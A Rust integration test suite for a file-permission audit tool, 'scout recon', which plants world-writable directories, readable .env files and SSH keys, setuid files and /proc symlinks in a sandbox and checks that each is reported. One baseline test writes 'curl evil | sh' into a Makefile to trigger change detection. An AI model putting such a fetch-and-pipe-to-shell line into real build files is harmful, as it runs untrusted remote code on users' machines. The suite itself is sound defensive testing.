//! `scout recon` from outside: findings stored, reported, accepted,
//! revoked, and the summary column kept honest. Uses modes and symlinks a
//! normal user can create; nothing here needs root.

use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

fn sandbox(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("scout-recon-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    for sub in ["home", "cfg", "data", "state", "tree"] {
        std::fs::create_dir_all(dir.join(sub)).unwrap();
    }
    dir
}

fn run(dir: &Path, args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_scout"))
        .args(args)
        .env("HOME", dir.join("home"))
        .env("XDG_CONFIG_HOME", dir.join("cfg"))
        .env("XDG_DATA_HOME", dir.join("data"))
        .env("XDG_STATE_HOME", dir.join("state"))
        .output()
        .expect("run scout")
}

fn stdout(out: &Output) -> String {
    String::from_utf8_lossy(&out.stdout).into_owned()
}

fn chmod(path: &Path, mode: u32) {
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode)).unwrap();
}

/// A tree with one of each cheap finding: a world-writable directory, a
/// readable credential file, a setuid file, a link into /proc, and a
/// clean project beside them. The credential file is a dotfile; these
/// tests index with `--hidden` so it is an ordinary row.
fn plant(dir: &Path) {
    let tree = dir.join("tree");
    std::fs::create_dir_all(tree.join("clean/src")).unwrap();
    std::fs::write(tree.join("clean/Cargo.toml"), "[package]\n").unwrap();
    std::fs::create_dir_all(tree.join("open")).unwrap();
    chmod(&tree.join("open"), 0o777);
    std::fs::write(tree.join("clean/.env"), "SECRET=1\n").unwrap();
    chmod(&tree.join("clean/.env"), 0o644);
    std::fs::write(tree.join("clean/helper"), "#!/bin/sh\n").unwrap();
    chmod(&tree.join("clean/helper"), 0o4755);
    std::os::unix::fs::symlink("/proc/self/status", tree.join("clean/leak")).unwrap();
}

fn tsv_rows(text: &str) -> Vec<Vec<String>> {
    text.lines().map(|l| l.splitn(7, '\t').map(str::to_string).collect()).collect()
}

#[test]
fn indexing_stores_findings_and_recon_reports_them() {
    let dir = sandbox("report");
    plant(&dir);
    let out = run(&dir, &["index", dir.join("tree").to_str().unwrap(), "--hidden"]);
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    assert!(stdout(&out).contains("recon finding(s)"), "{}", stdout(&out));

    let out = run(&dir, &["recon", "--format", "tsv"]);
    assert_eq!(out.status.code(), Some(1), "high findings exit 1:\n{}", stdout(&out));
    let rows = tsv_rows(&stdout(&out));
    let by_check = |check: &str| rows.iter().find(|r| r[1] == check).cloned();
    let open = by_check("world-writable-dir").expect("world-writable dir found");
    assert_eq!(open[0], "critical");
    assert!(open[5].ends_with("/tree/open"), "path is field 6: {open:?}");
    let secret = by_check("secret-exposed").expect(".env found");
    assert_eq!(secret[0], "critical", "world-readable credential");
    assert_eq!(by_check("suid").unwrap()[0], "critical");
    // The index holds canonical paths, so the link shows up as a finding
    // on the directory that contains it.
    let escape = by_check("symlink-escape").expect("link into /proc found on its directory");
    assert_eq!(escape[0], "high");
    assert!(escape[5].ends_with("/tree/clean"), "{escape:?}");
    assert!(escape[6].contains("leak -> /proc/self/status"), "{escape:?}");
    assert!(rows.iter().all(|r| r.len() == 7), "seven fields per row");
    assert!(!rows.iter().any(|r| r[5].ends_with("/clean/src")), "a clean directory has no finding");

    // Human output groups by severity and collapses home.
    let human = stdout(&run(&dir, &["recon"]));
    assert!(human.contains("\ncritical\n"), "{human}");
    assert!(human.find("critical").unwrap() < human.find("\nhigh\n").unwrap(), "{human}");

    // Narrowed to the clean project, the world-writable dir is out of scope.
    let narrowed =
        stdout(&run(&dir, &["recon", dir.join("tree/clean").to_str().unwrap(), "--format", "tsv"]));
    assert!(!narrowed.contains("world-writable-dir"), "{narrowed}");
    assert!(narrowed.contains("secret-exposed"), "{narrowed}");

    // --fail-on critical: still 1 (there are criticals); --fail-on low on a
    // clean tree would be 0, checked below after fixes.
    assert_eq!(run(&dir, &["recon", "--fail-on", "critical"]).status.code(), Some(1));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn accept_hides_a_finding_until_the_fact_changes_and_revoke_restores_it() {
    let dir = sandbox("accept");
    plant(&dir);
    let tree = dir.join("tree");
    assert!(run(&dir, &["index", tree.to_str().unwrap(), "--hidden"]).status.success());
    let open = tree.join("open");
    let open_s = open.to_str().unwrap();

    // Accepting a finding that does not exist is refused.
    let out = run(&dir, &["recon", "accept", open_s, "suid", "--reason", "no"]);
    assert_eq!(out.status.code(), Some(1));

    let out =
        run(&dir, &["recon", "accept", open_s, "world-writable-dir", "--reason", "shared scratch"]);
    assert_eq!(out.status.code(), Some(0), "{}", String::from_utf8_lossy(&out.stderr));
    let report = stdout(&run(&dir, &["recon", "--format", "tsv"]));
    assert!(!report.contains("world-writable-dir"), "accepted findings are hidden:\n{report}");
    let all = stdout(&run(&dir, &["recon", "--format", "tsv", "--all"]));
    let row = tsv_rows(&all)
        .into_iter()
        .find(|r| r[1] == "world-writable-dir")
        .expect("shown with --all");
    assert_eq!(row[4], "accepted");
    let human_all = stdout(&run(&dir, &["recon", "--all"]));
    assert!(human_all.contains("accepted: shared scratch"), "{human_all}");

    // The fact changes (sticky bit added): the exception lapses.
    chmod(&open, 0o1777);
    let report = stdout(&run(&dir, &["recon", "--format", "tsv"]));
    let row = tsv_rows(&report)
        .into_iter()
        .find(|r| r[1] == "world-writable-dir")
        .expect("back after the fact changed");
    assert_eq!(row[0], "high", "sticky world-writable dir is high, not critical");

    // Revoke on a fresh acceptance.
    chmod(&open, 0o777);
    assert_eq!(
        run(&dir, &["recon", "accept", open_s, "world-writable-dir", "--reason", "x"])
            .status
            .code(),
        Some(0)
    );
    assert_eq!(
        run(&dir, &["recon", "revoke", open_s, "world-writable-dir"]).status.code(),
        Some(0)
    );
    assert_eq!(
        run(&dir, &["recon", "revoke", open_s, "world-writable-dir"]).status.code(),
        Some(1),
        "nothing left to revoke"
    );
    assert!(stdout(&run(&dir, &["recon", "--format", "tsv"])).contains("world-writable-dir"));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn fixing_the_mode_clears_the_finding_on_the_next_run_and_a_clean_tree_exits_0() {
    let dir = sandbox("clear");
    plant(&dir);
    let tree = dir.join("tree");
    assert!(run(&dir, &["index", tree.to_str().unwrap(), "--hidden"]).status.success());
    // A first full run records the symlink escape too.
    assert_eq!(run(&dir, &["recon"]).status.code(), Some(1));
    chmod(&tree.join("open"), 0o755);
    chmod(&tree.join("clean/.env"), 0o600);
    chmod(&tree.join("clean/helper"), 0o755);
    std::fs::remove_file(tree.join("clean/leak")).unwrap();
    // The link is gone from disk but still an index row until a re-index;
    // its stat fails and it produces no findings.
    let out = run(&dir, &["recon", "--format", "tsv", "--fail-on", "low"]);
    let text = stdout(&out);
    let index_rows: Vec<_> =
        tsv_rows(&text).into_iter().filter(|r| r[4] != "-" || r[2] != "0").collect();
    assert!(index_rows.is_empty(), "every finding cleared once the facts changed:\n{text}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn the_summary_column_always_equals_the_aggregate() {
    let dir = sandbox("summary");
    plant(&dir);
    let tree = dir.join("tree");
    assert!(run(&dir, &["index", tree.to_str().unwrap()]).status.success());
    let open_s = tree.join("open").to_str().unwrap().to_string();
    assert_eq!(
        run(&dir, &["recon", "accept", &open_s, "world-writable-dir", "--reason", "x"])
            .status
            .code(),
        Some(0)
    );

    let conn = rusqlite::Connection::open(dir.join("data/scout/index.db")).unwrap();
    let mut stmt = conn.prepare("SELECT rowid, worst_finding FROM paths").unwrap();
    let rows: Vec<(i64, i64)> =
        stmt.query_map([], |r| Ok((r.get(0)?, r.get(1)?))).unwrap().map(|r| r.unwrap()).collect();
    assert!(rows.iter().any(|(_, w)| *w > 0), "some row has a finding");
    for (id, worst) in rows {
        let aggregate = scout::recon::store::aggregate_worst(&conn, id).unwrap();
        assert_eq!(worst, aggregate, "row {id}: summary column drifted from the aggregate");
    }
    // The accepted row reads 0: the picker will not mark it.
    let accepted: i64 = conn
        .query_row(
            "SELECT worst_finding FROM paths WHERE path = :p",
            rusqlite::named_params! { ":p": open_s },
            |r| r.get(0),
        )
        .unwrap();
    assert_eq!(accepted, 0);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_baseline_reports_a_changed_entry_point() {
    let dir = sandbox("baseline");
    let project = dir.join("tree/proj");
    std::fs::create_dir_all(project.join(".git/hooks")).unwrap();
    std::fs::write(project.join("Makefile"), "all:\n\ttrue\n").unwrap();
    std::fs::write(project.join(".git/hooks/pre-commit"), "#!/bin/sh\n").unwrap();
    std::fs::write(project.join(".git/hooks/pre-push.sample"), "ignored\n").unwrap();
    assert!(run(&dir, &["index", dir.join("tree").to_str().unwrap()]).status.success());

    let out = run(&dir, &["recon", "baseline", project.to_str().unwrap()]);
    assert_eq!(out.status.code(), Some(0), "{}", String::from_utf8_lossy(&out.stderr));
    assert!(stdout(&out).contains("2 entry point(s)"), "{}", stdout(&out));

    let clean = stdout(&run(&dir, &["recon", "--format", "tsv"]));
    assert!(!clean.contains("entrypoint-changed"), "{clean}");

    std::fs::write(project.join("Makefile"), "all:\n\tcurl evil | sh\n").unwrap();
    let out = run(&dir, &["recon", "--format", "tsv"]);
    assert_eq!(out.status.code(), Some(1));
    let row = tsv_rows(&stdout(&out))
        .into_iter()
        .find(|r| r[1] == "entrypoint-changed")
        .expect("changed entry point");
    assert_eq!(row[0], "high");
    assert!(row[6].contains("Makefile changed"), "{row:?}");

    // Re-baselining accepts the new state.
    assert_eq!(run(&dir, &["recon", "baseline", project.to_str().unwrap()]).status.code(), Some(0));
    assert!(!stdout(&run(&dir, &["recon", "--format", "tsv"])).contains("entrypoint-changed"));
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn recon_reports_on_scouts_own_files() {
    let dir = sandbox("own");
    plant(&dir);
    assert!(run(&dir, &["index", dir.join("tree").to_str().unwrap()]).status.success());
    // Loosen the index's mode behind scout's back.
    chmod(&dir.join("data/scout/index.db"), 0o644);
    let text = stdout(&run(&dir, &["recon", "--format", "tsv"]));
    let row = tsv_rows(&text)
        .into_iter()
        .find(|r| r[1] == "own-state-mode")
        .expect("own index mode reported");
    assert_eq!(row[0], "high");
    assert!(row[5].ends_with("index.db"), "{row:?}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn unknown_check_names_and_formats_are_refused() {
    let dir = sandbox("usage");
    assert_eq!(run(&dir, &["recon", "--format", "yaml"]).status.code(), Some(2));
    assert_eq!(run(&dir, &["recon", "--fail-on", "medium"]).status.code(), Some(2));
    assert_eq!(
        run(&dir, &["recon", "accept", "/x", "not-a-check", "--reason", "r"]).status.code(),
        Some(2)
    );
    let _ = std::fs::remove_dir_all(&dir);
}

/// A credential file is examined whether or not hidden entries are
/// candidates, and whether or not gitignore hides it: the walker records
/// it for recon only, and the picker never sees it. With `--hidden` the
/// same row becomes an ordinary candidate and keeps its finding.
#[test]
fn a_dotenv_is_a_finding_without_hidden_and_never_a_candidate_without_it() {
    let dir = sandbox("dotenv");
    let tree = dir.join("tree");
    // A git repository that ignores .env, the common shape.
    std::fs::create_dir_all(tree.join("repo/.git")).unwrap();
    std::fs::write(tree.join("repo/.gitignore"), ".env\n").unwrap();
    std::fs::write(tree.join("repo/.env"), "SECRET=1\n").unwrap();
    chmod(&tree.join("repo/.env"), 0o644);
    std::fs::write(tree.join("repo/README"), "hi\n").unwrap();
    // A home-shaped .ssh directory with a readable private key inside.
    std::fs::create_dir_all(tree.join("home/.ssh")).unwrap();
    chmod(&tree.join("home/.ssh"), 0o755);
    std::fs::write(tree.join("home/.ssh/id_ed25519"), "key\n").unwrap();
    chmod(&tree.join("home/.ssh/id_ed25519"), 0o644);
    std::fs::write(tree.join("home/.ssh/id_ed25519.pub"), "pub\n").unwrap();

    let out = run(&dir, &["index", tree.to_str().unwrap()]);
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    let report = stdout(&run(&dir, &["recon", "--format", "tsv"]));
    let rows = tsv_rows(&report);
    let secret_paths: Vec<&str> =
        rows.iter().filter(|r| r[1] == "secret-exposed").map(|r| r[5].as_str()).collect();
    assert!(secret_paths.iter().any(|p| p.ends_with("/repo/.env")), "{report}");
    assert!(secret_paths.iter().any(|p| p.ends_with("/home/.ssh/id_ed25519")), "{report}");
    assert!(secret_paths.iter().any(|p| p.ends_with("/home/.ssh")), ".ssh not 700: {report}");
    assert!(!secret_paths.iter().any(|p| p.ends_with(".pub")), "{report}");

    // Not candidates: the picker's set is what `query` ranks.
    assert_eq!(run(&dir, &["query", ".env"]).status.code(), Some(1), "hidden rows stay hidden");
    assert_eq!(run(&dir, &["query", "id_ed25519"]).status.code(), Some(1));
    assert_eq!(run(&dir, &["query", "README"]).status.code(), Some(0));

    // With --hidden the .ssh key is an ordinary candidate with its finding;
    // the gitignored .env is still recon-only.
    assert!(run(&dir, &["index", tree.to_str().unwrap(), "--hidden"]).status.success());
    assert_eq!(run(&dir, &["query", "id_ed25519"]).status.code(), Some(0));
    assert_eq!(
        run(&dir, &["query", ".env"]).status.code(),
        Some(1),
        "gitignored: never a candidate"
    );
    let report = stdout(&run(&dir, &["recon", "--format", "tsv"]));
    assert!(
        tsv_rows(&report).iter().any(|r| r[1] == "secret-exposed" && r[5].ends_with("/repo/.env")),
        "{report}"
    );
    let _ = std::fs::remove_dir_all(&dir);
}

/// `--since-last` shows what appeared after the previous run and exits 1
/// only for that; a second run in a row shows nothing new and exits 0;
/// a new loose file is one new finding.
#[test]
fn since_last_reports_only_findings_first_seen_after_the_previous_run() {
    let dir = sandbox("since");
    plant(&dir);
    let tree = dir.join("tree");
    assert!(run(&dir, &["index", tree.to_str().unwrap(), "--hidden"]).status.success());

    // First run: no previous run, so everything is new.
    let out = run(&dir, &["recon", "--since-last"]);
    assert_eq!(out.status.code(), Some(1), "{}", stdout(&out));
    let text = stdout(&out);
    assert!(text.contains("new (first run)"), "{text}");
    assert!(text.contains("world-writable-dir"), "{text}");

    // Nothing has changed: nothing is new, exit 0, even though the tree
    // still carries critical findings.
    let out = run(&dir, &["recon", "--since-last"]);
    assert_eq!(out.status.code(), Some(0), "{}", stdout(&out));
    assert!(stdout(&out).starts_with("nothing new since "), "{}", stdout(&out));
    assert_eq!(run(&dir, &["recon"]).status.code(), Some(1), "the full report still fails");

    // Timestamps are whole seconds: a change in the same second as the
    // previous run would be invisible, so cross the boundary first.
    std::thread::sleep(std::time::Duration::from_millis(1100));
    // A new world-writable file appears: exactly one new finding, TSV too.
    std::fs::write(tree.join("clean/loose"), b"x").unwrap();
    chmod(&tree.join("clean/loose"), 0o666);
    assert!(run(&dir, &["index", tree.to_str().unwrap()]).status.success());
    let out = run(&dir, &["recon", "--since-last", "--format", "tsv"]);
    assert_eq!(out.status.code(), Some(1));
    let rows = tsv_rows(&stdout(&out));
    assert_eq!(rows.len(), 1, "{rows:?}");
    assert_eq!(rows[0][1], "world-writable-file");
    assert!(rows[0][5].ends_with("/clean/loose"));

    // A new low finding alone does not fail the default threshold.
    std::thread::sleep(std::time::Duration::from_millis(1100));
    std::fs::write(tree.join("clean/groupy"), b"x").unwrap();
    chmod(&tree.join("clean/groupy"), 0o664);
    assert!(run(&dir, &["index", tree.to_str().unwrap()]).status.success());
    // Every --since-last run is a run, so each change gets one look.
    let out = run(&dir, &["recon", "--since-last"]);
    assert_eq!(out.status.code(), Some(0), "{}", stdout(&out));
    assert!(stdout(&out).starts_with("1 new since "), "{}", stdout(&out));
    std::thread::sleep(std::time::Duration::from_millis(1100));
    std::fs::write(tree.join("clean/groupy2"), b"x").unwrap();
    chmod(&tree.join("clean/groupy2"), 0o664);
    assert!(run(&dir, &["index", tree.to_str().unwrap()]).status.success());
    assert_eq!(run(&dir, &["recon", "--since-last", "--fail-on", "low"]).status.code(), Some(1));
    let _ = std::fs::remove_dir_all(&dir);
}

/// The wrapper is found where it lives: an rc file carrying the
/// installer's marker is reported with its line, and an rc file others
/// can edit is a finding whether or not the marker is in it.
#[test]
fn the_wrapper_is_located_in_rc_files_and_a_writable_rc_is_a_finding() {
    let dir = sandbox("rc");
    std::fs::create_dir_all(dir.join("tree/p")).unwrap();
    assert!(run(&dir, &["index", dir.join("tree").to_str().unwrap()]).status.success());
    let home = dir.join("home");
    std::fs::write(
        home.join(".bashrc"),
        "export X=1\n\n# >>> scout shell integration >>>\nsource /opt/scout/shell/scout.bash\n\
         # <<< scout shell integration <<<\n",
    )
    .unwrap();
    chmod(&home.join(".bashrc"), 0o644);
    std::fs::write(home.join(".zshrc"), "setopt something\n").unwrap();
    chmod(&home.join(".zshrc"), 0o664);

    let text = stdout(&run(&dir, &["recon"]));
    assert!(text.contains("wrapper: ~/.bashrc line 3"), "{text}");
    assert!(!text.contains("export X"), "rc contents are never reported: {text}");
    let tsv = stdout(&run(&dir, &["recon", "--format", "tsv"]));
    let rows = tsv_rows(&tsv);
    let rc = rows.iter().find(|r| r[1] == "own-wrapper-writable").expect("writable rc found");
    assert!(rc[5].ends_with("/.zshrc"), "{rc:?}");
    assert!(rc[6].contains("664"), "{rc:?}");
    assert!(
        !rows.iter().any(|r| r[1] == "own-wrapper-writable" && r[5].ends_with(".bashrc")),
        "a 644 rc is fine: {tsv}"
    );
    // --since-last is about stored findings; own-state lines stay out.
    let since = stdout(&run(&dir, &["recon", "--since-last", "--format", "tsv"]));
    assert!(!since.contains("own-wrapper-writable"), "{since}");
    let _ = std::fs::remove_dir_all(&dir);
}
